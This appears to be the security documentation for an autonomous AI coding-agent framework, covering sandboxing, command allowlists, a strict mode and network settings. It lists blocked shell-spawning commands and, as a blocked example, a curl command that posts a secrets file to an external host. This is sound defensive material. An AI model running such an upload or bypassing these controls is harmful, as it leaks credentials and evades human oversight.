# Security Model

Auto-Claude is an autonomous AI agent framework that executes code. This document describes the security model and available hardening options.

## Three-Layer Defense

### 1. OS Sandbox (Claude SDK)
The underlying Claude SDK provides OS-level sandboxing for bash commands. This is the primary isolation layer.

### 2. Filesystem Permissions
Operations are restricted to the project directory. Agents cannot access files outside the working directory.

### 3. Command Allowlist
Dynamic allowlist based on detected project stack. Commands are validated before execution.

## Security Modes

### Normal Mode (Default)
- All base commands available
- Backward compatible with existing projects
- Basic validators for dangerous operations (rm, chmod, kill, etc.)

### Strict Mode
Enable with: `SECURITY_STRICT_MODE=true`

Strict mode provides additional protection against prompt injection and data exfiltration:

**Blocked Commands:**
- `eval` - Can execute arbitrary shell code
- `exec` - Can replace current process
- `sh`, `bash`, `zsh` - Shell spawning bypasses command validation

**Validated Commands:**
- `curl` - POST/PUT to external hosts blocked (GET allowed)
- `wget` - POST to external hosts blocked (GET allowed)
- Localhost requests are always allowed (local development)

## Command Validators

The following commands have validation even in normal mode:

| Command | Validation |
|---------|------------|
| `rm` | Blocks dangerous paths (/, /home, /etc, etc.) |
| `chmod` | Only allows safe modes (+x, 755, 644, etc.) |
| `kill/pkill/killall` | Validates target processes |
| `git commit` | Scans for secrets before commit |
| `dropdb/dropuser` | Requires confirmation |
| `psql/mysql/redis-cli` | Blocks destructive operations |

## Network Security

### MCP Servers
Auto-Claude can connect to external MCP servers. Review your `.env` configuration:

- **Linear** - Sends task updates to linear.app
- **Puppeteer** - Browser automation (can load any URL)
- **Context7** - External documentation service
- **Graphiti** - Optional graph memory (configurable URL)

### Data Exfiltration Prevention (Strict Mode)
In strict mode, curl and wget are validated:

```bash
# Allowed (GET request)
curl https://example.com/api/data

# Blocked (POST to external host)
curl -X POST https://external.com/collect -d @secrets.json

# Allowed (POST to localhost)
curl -X POST http://localhost:8000/api -d '{"key": "value"}'
```

## Recommendations

### For Sensitive Codebases
1. Enable strict mode: `SECURITY_STRICT_MODE=true`
2. Disable unused integrations in `.env`
3. Run in an isolated environment (VM/container)
4. Review the generated `.auto-claude-security.json`

### For Maximum Security
```bash
# .env configuration
SECURITY_STRICT_MODE=true
GRAPHITI_ENABLED=false
ELECTRON_MCP_ENABLED=false
# LINEAR_API_KEY=  # Leave empty
```

## Git Worktree Isolation

All builds run in isolated git worktrees:
- Changes stay local until explicitly merged
- No automatic pushes to remote
- User reviews changes before merge

This prevents accidental modifications to the main branch.

## Reporting Security Issues

If you discover a security vulnerability, please report it responsibly:
1. Do NOT open a public issue
2. Email the maintainer directly
3. Allow time for a fix before disclosure
